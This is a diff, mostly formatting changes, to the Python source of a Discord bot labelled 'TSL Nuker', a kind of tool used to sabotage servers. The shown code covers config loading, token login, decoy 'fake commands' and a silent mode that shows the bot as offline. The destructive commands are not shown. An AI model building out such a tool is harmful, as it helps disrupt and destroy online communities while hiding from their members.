@@ -10,11 +10,14 @@ from os import system, name
 import fade  # Falls "fade" eine separate Bibliothek ist, die du verwendest
 import asyncio
 
+
 def clear():
     if name == 'nt':
         _ = system('cls')
+
     else:
         _ = system('clear')
+
 
 # Initialisiere Colorama
 init(autoreset=True)
@@ -24,7 +27,8 @@ config_file_name = 'main_cfg.ini'
 config_file_path = Path(r'Configs\\main_cfg.ini')
 # Überprüfe und erstelle notwendige Dateien
 if not config_file_path.is_file():
-    print(f'{Fore.RED}[ERROR]' + f'{Fore.RESET} Config file not found at {config_file_path}.')
+    print(f'{Fore.RED}[ERROR]' +
+          f'{Fore.RESET} Config file not found at {config_file_path}.')
     input('Press Enter to exit...')
     quit()
 
@@ -44,11 +48,12 @@ nversion = '1.0'
 # os.system(f"title TSL Nuker - v{nversion} - Made By TSL Tobi and TSL Max")
 
 # Paths
-configs_dir = Path('Configs') 
+configs_dir = Path('Configs')
 configs_dir.mkdir(parents=True, exist_ok=True)
 
 # Erstelle die Dateien, wenn sie nicht existieren
-file_paths_to_create = ['list_of_fake_commands.txt', 'nuker_reactions_to_fake_commands.txt']
+file_paths_to_create = ['list_of_fake_commands.txt',
+                        'nuker_reactions_to_fake_commands.txt']
 for file_path in file_paths_to_create:
     file_path_full = configs_dir / file_path
     if not file_path_full.is_file():
@@ -69,7 +74,8 @@ if config_file_path.is_file():
     print(f'{Fore.YELLOW}[Config System]{Fore.RESET} Config found!')
     print(f'{Fore.CYAN}[BOT]{Fore.RESET} Starting...')
 else:
-    print(f'{Fore.RED}[ERROR]{Fore.RESET} Config not found! Creating a new config...')
+    print(
+        f'{Fore.RED}[ERROR]{Fore.RESET} Config not found! Creating a new config...')
     config['BOT_CFG'] = {'prefix': '!',
                          'token': 'bot token here',
                          # Füge hier weitere Konfigurationsoptionen hinzu
@@ -79,7 +85,8 @@ else:
     with open(config_file_path, 'w') as cfg_file:
         config.write(cfg_file)
     print(f'{Fore.YELLOW}[Config System]{Fore.RESET} Done!')
-    print(f'{Fore.YELLOW}[Config System]{Fore.RESET} Edit the config file in your folder and try again')
+    print(
+        f'{Fore.YELLOW}[Config System]{Fore.RESET} Edit the config file in your folder and try again')
     input('Press Enter to close the program...')
     quit()
 
@@ -108,7 +115,8 @@ is_fake_commands_enabled = str(config['Fake commands']['Enabled?'])
 
 intents = Intents.default()
 intents.members = True
-client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents.all())
+client = commands.Bot(command_prefix=prefix,
+                      help_command=None, intents=intents.all())
 
 bot_started_text = f'{Fore.MAGENTA}Bot launched successfully!'
 
@@ -117,7 +125,8 @@ def login():
     try:
         client.run(token)
     except:
-        print(f'{Fore.RED}[ERROR]{Fore.RESET} Invalid token. Please change the token and try again.')
+        print(
+            f'{Fore.RED}[ERROR]{Fore.RESET} Invalid token. Please change the token and try again.')
         input('Press Enter to exit...')
         quit()
 
@@ -131,7 +140,8 @@ async def rmm():
 
 list_of_fake_commands = open('Configs\\list_of_fake_commands.txt', 'r')
 list_of_fake_commands = list_of_fake_commands.readlines()
-response_to_fake_commands = open('Configs\\nuker_reactions_to_fake_commands.txt', 'r')
+response_to_fake_commands = open(
+    'Configs\\nuker_reactions_to_fake_commands.txt', 'r')
 response_to_fake_commands = response_to_fake_commands.readlines()
 
 
@@ -154,7 +164,6 @@ async def on_command_error(ctx, error):
     await asyncio.sleep(1)
 
 
-
 @client.event
 async def on_ready():
     if ac_type == 1 and silent_mode == 0:
@@ -168,6 +177,7 @@ async def on_ready():
     elif silent_mode == 1:
         await client.change_presence(status=discord.Status.offline)
     await rmm()
+
 
 @client.event
 async def on_command_error(ctx, error):
